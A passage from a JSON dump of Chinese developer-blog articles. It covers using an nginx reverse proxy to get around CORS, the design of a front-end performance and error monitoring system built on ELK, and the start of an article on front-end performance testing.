src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde74a8e2f2?w=1225\u0026amp;h=871\u0026amp;f=png\u0026amp;s=129838\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e哇塞通啦，200诶！我啥都没操作只是写了个$.ajax就通了呀？通个毛......\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e以上console是标准的跨域error，就算返回200也会被浏览器自身给截掉，无论如何success都获取不到Response里的值\n\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e开始nginx反向代理（进阶）\u003c/h2\u003e\n\u003cp\u003e这里就不讲正常情况下nginx如何配置了，百度很多。\n这里直接附上我的github，大家去下载并且我对以下代码进行\u003cstrong\u003eJS配置讲述\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e（\u003cstrong\u003e下载是非常必要的，因为在github上我内置了nginx\u003c/strong\u003e）\u003c/p\u003e\n\u003cp\u003eGithub：https://github.com/gs3170981/nginx_quick\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e步骤一：配置server.js\u003c/h3\u003e\n\u003cp\u003e1）下载完目录结构应该是这样的\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e这里我内置了nginx，开不开心。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"目录结构\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde66540179?w=293\u0026amp;h=199\u0026amp;f=png\u0026amp;s=7769\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e2）打开server.js，里面大致内容是这样的\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"配置内容\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6d3c5211?w=728\u0026amp;h=390\u0026amp;f=png\u0026amp;s=33211\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e3）如果你了解过或曾经配过nginx，那你一定很鸡冻，没错，这里呈现的就是配置项，意味着以后管理配置文件只需要修改这儿就OK了，因为有注释我就不一一解释了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注意'/'别写反了，不然会被转义报错\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e步骤二：执行node命令\u003c/h3\u003e\n\u003cp\u003e1）win+r 打开你的cmd，cd到nginx所在的目录（即是下载后所在的目录）执行\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003enode server\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e如果cmd没报错的话，你的文件结构应该变成如此了\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"文件结构\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6fd96c6c?w=342\u0026amp;h=445\u0026amp;f=png\u0026amp;s=18563\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e2）那么请再执行\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003enginx\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e如果你除了关闭啥都点不了的话，说明开启成功了（老司机一般都不会这样用...嘿嘿，\u003cstrong\u003e推荐到目录下双击执行\u003c/strong\u003e）\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e步骤三：请求试试！\u003c/h3\u003e\n\u003cp\u003enginx是服务器，所以开启的port必须为js文件中设置的port\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e打开127.0.0.1:8016\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"8016服务器\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde8fbb16e7?w=485\u0026amp;h=225\u0026amp;f=png\u0026amp;s=8394\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我擦，咋啥都没显示？不是js中都输出了吗？我们来看看控制台\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"请求\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde94898053?w=1209\u0026amp;h=698\u0026amp;f=png\u0026amp;s=109437\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e汗，还是跨域了，不过如果你是老手的话，应该已经意识到为什么开始要讲解下什么是正向/反向代理，因为还少一步\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e步骤四：最后再战！\u003c/h3\u003e\n\u003cp\u003e打开index.html，修改一点点的代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE\u0026gt;\n\u0026lt;html\u0026gt;\n  \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e /\u0026gt;\n  \u0026lt;head\u0026gt;\n    \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\n  \u0026lt;/head\u0026gt;\n  \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt;\n  \u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"https://code.jquery.com/jquery-3.0.0.min.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n  \u0026lt;script\u0026gt;\n    $.ajax({\n      \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e,\n      url: \u003cspan class=\"hljs-string\"\u003e\"connectmanager/user/updateFlashInfo\"\u003c/span\u003e, // 注意这里改成了相对路径\n      data: \u003cspan class=\"hljs-string\"\u003e'{\"appid\":\"tieba\",\"cuid\":\"73118464C47E43476FB3E50ACD8E32C9:FG:1\",\"connection_id\":\"\",\"lcs_ip\":\"10.46.235.62\",\"lcs_port\":\"8891\",\"lcs_fd\":\"10619\",\"device_type\":\"21\"}'\u003c/span\u003e,\n      async: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n      success: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (res) {\n        document.write(JSON.stringify(res))\n      }\n    })\n  \u0026lt;/script\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eA、B是相互认识并在同一服务器上的，B代理了C，则相当于同在了一个地址下，所以需改成\u003cstrong\u003e相对路径\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e好，保存刷新一下\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"再请求\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde65ed3c58?w=442\u0026amp;h=163\u0026amp;f=png\u0026amp;s=9521\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e天啦噜，好像成功呢了，再看下请求\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"正确返回\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde7275c2be?w=827\u0026amp;h=726\u0026amp;f=png\u0026amp;s=54005\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e没有报错，正确返回了呢！\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e相关技术链接\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e该文章运用到了node（fs模块）想多了解的，请移步下方链接查看\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eCSDN：http://blog.csdn.net/Mcky_Love/article/details/78679291\u003c/p\u003e\n\u003cp\u003e掘金：https://juejin.im/post/5a28aead6fb9a0450c494bc6\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e关于\u003c/h2\u003e\n\u003cp\u003emake：o︻そ╆OVE▅▅▅▆▇◤（清一色天空）\u003c/p\u003e\n\u003cp\u003eblog：http://blog.csdn.net/mcky_love\u003c/p\u003e\n\u003cp\u003egithub：https://github.com/gs3170981/nginx_quick（好用的话记得加星哦！）\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e结束语\u003c/h2\u003e\n\u003cp\u003e该功能的实现主归功于fs的文件创建便利，此项可用于多种批量文件/文件夹操作的环境，不单指向开发哦~\u003c/p\u003e\n","buildTime":"1514894315.5466","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f40"},"id":"5a3e121451882533f01ec66d","author":{"$oid":"5a4b76d92239bd131cd79f32"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/23/160840e071212dc6?w=2574\u0026h=628\u0026f=png\u0026s=110801","https://user-gold-cdn.xitu.io/2017/12/24/16087e2e000f7091?w=1346\u0026h=928\u0026f=png\u0026s=261795","https://user-gold-cdn.xitu.io/2017/12/24/1608802bb17017bb?w=1328\u0026h=1062\u0026f=png\u0026s=445377","https://user-gold-cdn.xitu.io/2017/12/24/16087ff57e7be943?w=1522\u0026h=972\u0026f=png\u0026s=307385","https://user-gold-cdn.xitu.io/2017/12/24/1608806a8c9f64b5?w=1562\u0026h=650\u0026f=png\u0026s=245799"],"screenShot":null}],"title":"2017前端监控系统探索总结","meta":{"likeCount":0},"tag":["前端","API","数据分析","产品"],"comment":[],"shortContent":"在当下互联网行业，监控概念与重要性已经不需要再进行阐述，然而监控分为多种，对物理层（机房，云主机）的监控，对传输链路的监控，对已部署服务的监控等等，而后端的代码通常直接运行在服务器并处于24小时实时的监控状态之下，一旦服务的可用性出现问题，SRE和DEV往往在第一时间就会收到告…","content":"\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e背景\n\u003c/h2\u003e\u003cp\u003e在当下互联网行业，监控概念与重要性已经不需要再进行阐述，然而监控分为多种，对物理层（机房，云主机）的监控，对传输链路的监控，对已部署服务的监控等等，而后端的代码通常直接运行在服务器并处于24小时实时的监控状态之下，一旦服务的可用性出现问题，SRE和DEV往往在第一时间就会收到告警，并根据告警信息在第一时间解决故障。相比之下，前端代码则运行在客户端上，为了让前端能够和后端一样，需要将客户端的前端代码监控起来，当客户端出现故障时，能第一时间通知到前端负责人，定位故障，及时止损。\u003c/p\u003e\u003cp\u003e那\u003cb\u003e前端监控系统\u003c/b\u003e都需要监控什么？在前端应用日渐复杂的今天，我认为对于前端的监控主要分为三个方面：\u003c/p\u003e\u003cp\u003e\u003cb\u003e性能监控\u003c/b\u003e\u003c/p\u003e\u003cp\u003e为什么要监控性能呢？因为对于任何一家互联网公司，性能往往与利益直接相关。有数据调查显示：当Google 延迟 \u003cb\u003e400ms时，\u003c/b\u003e搜索量下降 \u003cb\u003e0.59%\u003c/b\u003e、Bing 延迟 \u003cb\u003e2s\u003c/b\u003e，收入下降 \u003cb\u003e4.3%、\u003c/b\u003eYahoo 延迟 \u003cb\u003e400ms\u003c/b\u003e，流量下降 \u003cb\u003e5-9%，\u003c/b\u003e所以，很多公司在做用户体验分析时，第一个看的就是性能监控指标，\u003cspan\u003e在前端领域，性能无非是以下参考指标：\u003c/span\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e白屏时间；\u003c/li\u003e\u003cli\u003e首屏时间；\u003c/li\u003e\u003cli\u003e用户可交互时间；\u003c/li\u003e\u003cli\u003e总下载时间；\u003c/li\u003e\u003cli\u003eTCP连接时间；\u003c/li\u003e\u003cli\u003eHTTP请求时间；\u003c/li\u003e\u003cli\u003eHTTP响应时间；\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cspan\u003e而且很重要的一点，也是大家往往最容易忽视的：\u003c/span\u003e\u003cb\u003e性能会伴随产品的迭代而有所衰减\u003c/b\u003e。特别在移动端，网络条件十分不稳定的情况下。性能优化不存在“黄金法则”，我们需要一套性能监控系统持续监控、评估、预警页面性能状况、发现瓶颈，更有针对性的指导优化工作的进行。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e异常监控\u003c/b\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e除了性能之外，我们还要监控客户端脚本发生的报错，前端报错受\u003cb\u003e网络，机型，业务逻辑\u003c/b\u003e影响而且大部分错误难以还原现场，比如我们团队时时收到用户的反馈和投诉：\u003c/p\u003e\u003cul\u003e\u003cli\u003e甲用户 : 点击XX按钮之后页面白屏了\u0026nbsp;\u003cbr\u003e\u003c/li\u003e\u003cli\u003e乙用户:\u0026nbsp; 优惠劵消费后，支付金额显示不正确\u003c/li\u003e\u003cli\u003e丙用户：最近页面特别卡，点击tab好久才能反应过来\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e面对用户的反馈，开发经常感到困惑：到底有多卡，哪个步骤卡？是个别现象还是大面积都受到了影响？白屏时页面请求的返回码是多少？是被运行商劫持还是CDN出了问题？能让用户用Charles配合抓个包么？如何做有针对性的优化？优化的结果怎么去衡量？\u003c/p\u003e\u003cp\u003e为了解决这些痛点，我们需要对客户端服务进行\u003cb\u003e\u003ci\u003e基于用户行为\u003c/i\u003e\u003c/b\u003e的监控。\u003c/p\u003e\u003cp\u003e\u003cb\u003e数据监控\u003c/b\u003e\u003c/p\u003e\u003cp\u003e互联网公司的产品，每一个决策，每一个迭代都需要分析各种数据，数据中往往会有我们需要的答案：\u003c/p\u003e\u003col\u003e\u003cli\u003e页面PV,UV可能直接影响转化率\u003c/li\u003e\u003cli\u003e从用户访问页面的顺序挖掘使用习惯（等等）\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e这部分监控数据主要供PM/PD使用，业务数据可以驱动业务自身的增长，有人曾说：“要降低创业失败的可能性只有两种方法：一是未卜先知，另一个是做精益的数据分析”，由此可见数据分析的重要性。\u003c/p\u003e\u003ch2\u003e传统解决方案及缺陷\u003c/h2\u003e\u003cp\u003e目前已经存在了一些针对前端监控解决方案：Sentry,Badjs,jsTracker,GrowingIo等等，在公司内部也有自研的监控系统。它们都从不同维度试着解决前端在监控方面的问题，大家的实现思路都很类似、要实现监控，首先要采集指标：\u003c/p\u003e\u003ch3\u003e性能指标\u003c/h3\u003e\u003cp\u003e这里要针对的主要是白屏时间、首屏时间、用户可操作、总下载时间。\u003c/p\u003e\u003cp\u003e这里以首屏时间为例：高版本chrome浏览器中可以直接通过 firstPaintTime 接口来获取load time，但大部分浏览器并不支持，必须想其他办法来监测。谨记一点，在做时间相关测量时，千万不要使用setTimeout和setInterval方法，因为在单线程执行引擎中，异步队列的执行是\u003cb\u003e不能确保执行时间\u003c/b\u003e的。这边给出一种可行的测量方案，准确率在99成以上。\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u0026lt;doctype html\u0026gt;\n\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n            var timerStart = Date.now();\n        \u0026lt;/script\u0026gt;\n        \u0026lt;!-- 加载其他资源，执行代码blabla --\u0026gt;\n    \u0026lt;/head\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;!-- 路由框架挂载节点 --\u0026gt;\n\n        \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n             $(document).ready(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n                 console.log(\u003cspan class=\"hljs-string\"\u003e\"DOMready 时间 \"\u003c/span\u003e, Date.now()-timerStart);\n             });\n             $(window).load(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n                 console.log(\u003cspan class=\"hljs-string\"\u003e\"所有资源加载完成 时间: \"\u003c/span\u003e, Date.now()-timerStart);\n             });\n        \u0026lt;/script\u0026gt;\n    \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e另一种优雅的解决方案是直接使用window.performance接口：\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econnectEnd                 Time when server connection is finished.\nconnectStart               Time just before server connection begins.\ndomComplete                Time just before document readiness completes.\ndomContentLoadedEventEnd   Time after DOMContentLoaded event completes.\ndomContentLoadedEventStart Time just before DOMContentLoaded starts.\ndomInteractive             Time just before readiness \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to interactive.\ndomLoading                 Time just before readiness \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to loading.\ndomainLookupEnd            Time after domain name lookup.\ndomainLookupStart          Time just before domain name lookup.\nfetchStart                 Time when the resource starts being fetched.\nloadEventEnd               Time when the load event is complete.\nloadEventStart             Time just before the load event is fired.\nnavigationStart            Time after the previous document begins unload.\nredirectCount              Number of redirects since the last non-redirect.\nredirectEnd                Time after last redirect response ends.\nredirectStart              Time of fetch that initiated a redirect.\nrequestStart               Time just before a server request.\nresponseEnd                Time after the end of a response or connection.\nresponseStart              Time just before the start of a response.\ntiming                     Reference to a performance timing object.\nnavigation                 Reference to performance navigation object.\nperformance                Reference to performance object \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a window.\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e                       Type of the last non-redirect navigation event.\nunloadEventEnd             Time after the previous document is unloaded.\nunloadEventStart           Time just before the unload event is fired.\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接口兼容性：\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/23/160840e071212dc6?w=2574\u0026amp;h=628\u0026amp;f=png\u0026amp;s=110801\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e异常指标\u003c/b\u003e\u003c/p\u003e\u003cp\u003e主动捕获异常方案主要是 onError 和 addEventListener，onError 在 IE6 开始就支持了，所以 大部分系统的主动采集是使用的 onError。这里注意\u003cb\u003e浏览器的同源性策略（CORS），\u003c/b\u003e在高级浏览器中如果浏览器捕获到了错误信息，如果 JS 文件所在的域名（如：meituan.com）和当前的页面地址（如：dianping.com)是跨域的，那么引擎会自动把onError 中的参数 替换为 script error，此时无法获取行列数以及报错详细信息。解决方案是在标签引入时加上crossorigin字段。\u003cb\u003e\u003cbr\u003e\u003c/b\u003e\u003c/p\u003e\u003cp\u003e虽然传统方法能够自动catch大部分错误，但是也伴随着以下\u003cb\u003e缺陷\u003c/b\u003e：\u003c/p\u003e\u003col\u003e\u003cli\u003e部分应用在不同网络，机型上表现不同，开发人员需要获取到更详细的分类信息，传统系统很难做分类聚合，开发面对几十页分类的table无从下手。\u003c/li\u003e\u003cli\u003e错误与错误之间往往成相关性，但是在传统系统中catch到的错误都是孤立的，没有基于用户行为的分析。\u003c/li\u003e\u003cli\u003e针对异常的告警配置不够灵活，无法满足开发需求：大部分异常告警指标伴随高低峰期波动，没有一成不变的指标，而传统告警平台都是采用绝对阈值的告警方案，要么高峰期误报太多，要么低峰期错误无法发现。\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e\u003cb\u003e数据指标\u003c/b\u003e\u003c/p\u003e\u003cp\u003e传统监控方案采用的都是手动埋点上报，但是缺点十分明显：手动埋点往往会出现\u003cb\u003e埋点混乱\u003c/b\u003e，甚至\u003cb\u003e埋错、漏埋\u003c/b\u003e的问题，埋点沟通过程中，数据团队和业务工程团队配合困难，新功能的开发往往伴随着新埋点的增加，而且数据团队的需求优先级往往靠后，导致很多新上线功能得不到数据的验证。\u003c/p\u003e\u003cp\u003e而有些基于关系型数据库的系统\u003cb\u003e实时性差\u003c/b\u003e，数据要隔天才能查看，查询命令执行一次动辄耗费几十分钟乃至上小时，已经没有效率可言。\u003c/p\u003e\u003ch2\u003e新解决方案\u003c/h2\u003e\u003cp\u003e伴随着上面讨论的问题，我们寻求新的解决方案，一种\u003cb\u003e高可用\u003c/b\u003e的监控方案。它应该具有如下特征：\u003c/p\u003e\u003col\u003e\u003cli\u003e\u003cb\u003e全量采集\u003c/b\u003e：监控指标健全，端到端采集全量的性能指标，关键执行方法，业务指标，覆盖率做到2个9以上。\u003c/li\u003e\u003cli\u003e\u003cb\u003e无需埋点\u003c/b\u003e：全量上报，无需开发人员手动埋点，从根本上杜绝错埋和漏埋\u003c/li\u003e\u003cli\u003e\u003cb\u003e查询便捷\u003c/b\u003e：能够按照地域，机型，操作系统，浏览器版本，网络状况等多个维度进行数据查询，最好支持全文搜索，分类聚合。\u003c/li\u003e\u003cli\u003e\u003cb\u003e场景还原\u003c/b\u003e：根据打点信息，还原用户从登陆开始一系列操作，建立基于用户行为的时序图。\u003c/li\u003e\u003cli\u003e\u003cb\u003e实时性强\u003c/b\u003e：秒级查询，上线后能立即看到优化效果并指导下一步优化。\u003c/li\u003e\u003cli\u003e\u003cb\u003e智能告警\u003c/b\u003e：采用静态阈值和动态阈值结合的方式，兼顾高低峰，减少误报漏报。并针对业务数据建立告警指标，发现系统深层次问题。\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e根据这些需求，我们团队打造了一套全新的监控体系，新系统采用了\u003cb\u003e无埋点SDK\u003c/b\u003e（小程序），\u003cb\u003eELK\u003c/b\u003e做本地化日志存储，并使用了基于\u003cb\u003e动态阈值\u003c/b\u003e的告警策略。下面是系统架构图：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/24/16087e2e000f7091?w=1346\u0026amp;h=928\u0026amp;f=png\u0026amp;s=261795\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e开发人员在本地通过代码接入SDK后，即可使用监控体系的全部功能：数据采集，上报，聚合分析，智能告警等功能，而且所有数据均是实时上报，秒级查询。\u003c/p\u003e\u003cp\u003e在最开始探索过程中，我们使用webpack插件+npm包下载方式，但是由于两部分上报逻辑在网络极差的情况下，会出现写缓存冲突的问题，导致重复上报或错误上报，现已将架构调整为单一script标签引入的方式，部分保留下来的主动上报接口，开发可以根据自己需要在业务代码中再次封装：\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e...\nmoduleClick(options) {\n        const { name, ...otherOptions } = options;\n        M.moduleClick(name, otherOptions);\n    },\n    /**\n     * 曝光事件\n     * @param options\n     */\n    moduleView(options) {\n        const { name, ...otherOptions } = options;\n        M.moduleView(name, otherOptions);\n    },\n    /**\n     * 编辑事件\n     * @param options\n     */\n    moduleEdit(options) {\n        const { name, ...otherOptions } = options;\n        M.moduleEdit(name, otherOptions);\n    },\n...\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u0026nbsp;接入后，新版系统和之前相比有哪些变化？\u003c/p\u003e\u003cp\u003e1.因为采集是无埋点全量的，关键方法都会进行参数上报，然后可以通过分类聚合建立用户的操作时序，通过故障上下文准确定位问题。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/24/1608802bb17017bb?w=1328\u0026amp;h=1062\u0026amp;f=png\u0026amp;s=445377\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e2. 对resource和ajax请求指标做采集，可以筛选出故障用户当时的场景信息：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/24/16087ff57e7be943?w=1522\u0026amp;h=972\u0026amp;f=png\u0026amp;s=307385\"\u003e\u003c/p\u003e\u003cp\u003e3.告警采用动态阈值，对于周期性强的数据，通过机器学习的算法进行环比告警，大大降低了误报和漏报：\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/24/1608806a8c9f64b5?w=1562\u0026amp;h=650\u0026amp;f=png\u0026amp;s=245799\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e在做日志存储的时候，数据量是一个挑战，我们采用的是集群架构，但是一个用户量很大的站点，日志的上报量是非常高的，高峰期时，一个1万日活APP可能会突破3000的qps,这对日志系统并发能力和稳定性是很大的挑战。我们选择了全量master+data节点的方式，对数据副本分片设置为1，任意一台节点挂掉，会由副本选举出新的主分片，不会造成日志丢失。在写入方面，我们选择了bulk方式批量写入，通过反复试验，批量写入线程大小在5MB-15MB之间。由于日志系统是主要面对写入的，所以关闭了_all查询，写入性能优化1倍，同时gc新老分配为1：4，保证了批量写入的稳定。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e总结与未来规划\u003c/h2\u003e\u003cp\u003e通过对新监控解决方案的探索，我们积累了比较宝贵的数据分析经验，对于终端哪些数据对于故障处理，性能优化起到重要作用有了新的认识，不过目前系统仍处于迭代过程中，距离预定的目标还有比较大的优化空间。\u003c/p\u003e\u003cp\u003e在未来，我们将重点攻克以下几个问题：\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e1.系统轻量化\u003c/div\u003e\u003cp\u003e减少上报量：合并数据结构，释放更多上行带\u003c/p\u003e\u003cp\u003e优化SDK性能：减少缓存写入频率，做到业务对监控模块无感\u003c/p\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e2.让监控更智能\u003c/div\u003e\u003cp\u003e识别周高峰和节假日，同时增强数据清洗能力，提高数据的可用性\u003c/p\u003e\u003c/div\u003e\u003cp\u003e3.优化数据分析体验\u003c/p\u003e\u003cp\u003e开放埋点配置平台，让产品自主配置业务埋点，通过配置文件转化成埋点，省时高效。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514893889.7558","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f41"},"id":"5a41abb35188252a3d383eb8","author":{"$oid":"5a4b76d92239bd131cd79f2f"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/27/16096042768dd0de?w=600\u0026h=198\u0026f=jpeg\u0026s=23478","https://user-gold-cdn.xitu.io/2017/12/27/160960653e011768?w=1271\u0026h=670\u0026f=png\u0026s=107043"],"screenShot":null}],"title":"前端性能优化之性能测试","meta":{"likeCount":0},"tag":["前端","JavaScript","单元测试","浏览器"],"comment":[],"shortContent":"获取和衡量一个页面的性能，主要可以通过以下几个方面：Performance Timing API、Prpfile 工具、页面埋点计时、资源加载时序图分析。 内核浏览器中用于记录页面加载和解析过程中关键时间点的机制，它可以详细记录每个页面资源从开始加载到解析完成这一过程中具体操作…","content":"\u003cblockquote\u003e\n\u003cp\u003e前端性能优化是一个很宽泛的概念，有很多教程都有前端性能优化的方法，这也是我们一直在关注的一件重要事情。配合各种方式、手段、辅助系统，前端优化的最终目的都是提升用户体验，改善页面性能，我们常常竭尽全力进行前端页面优化，但却忽略了这样做的效果和意义。先不急于探究前端优化具体可以怎样去做，先看看什么是前端性能，应该怎样去了解和评价前端页面的性能。\u003c/p\u003e\n\u003cp\u003e通常前端性能可以认为是用户获取所需要页面数据或执行某个页面动作的一个实时性指标，一般以用户希望获取数据的操作到用户实际获得数据的时间间隔来衡量。例如用户希望获取数据的操作是打开某个页面，那么这个操作的前端性能就可以用该用户操作开始到屏幕展示页面内容给用户的这段时间间隔来评判。用户的等待延时可以分成两部分：\u003cstrong\u003e可控\u003c/strong\u003e 等待延时和 \u003cstrong\u003e不可控\u003c/strong\u003e 等待延时。\u003cstrong\u003e可控\u003c/strong\u003e 等待延时可以理解为能通过技术手段和优化来改进缩短时间的部分，例如减小图片大小让请求加载更快、减少 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求数等。\u003cstrong\u003e不可控\u003c/strong\u003e 等待延时则是不能或很难通过前后端技术手段来改进优化的，例如鼠标点击延时、\u003cstrong\u003eCPU\u003c/strong\u003e 计算时间延时、\u003cstrong\u003eISP(Internet Service Provider，互联网服务提供商)\u003c/strong\u003e 网络传输延时等。所以要知道的是，前端中的所有优化都是针对 \u003cstrong\u003e可控等待延时\u003c/strong\u003e 这部分来进行的，下面来了解一下如何获取和评价一个页面的具体性能。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e前端性能测试\u003c/h2\u003e\n\u003cp\u003e获取和衡量一个页面的性能，主要可以通过以下几个方面：\u003ccode\u003ePerformance Timing API\u003c/code\u003e、\u003ccode\u003ePrpfile\u003c/code\u003e 工具、页面埋点计时、资源加载时序图分析。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003ePerformance Timing  API\u003c/h4\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.w3.org/TR/resource-timing/\"\u003ePerformance Timing 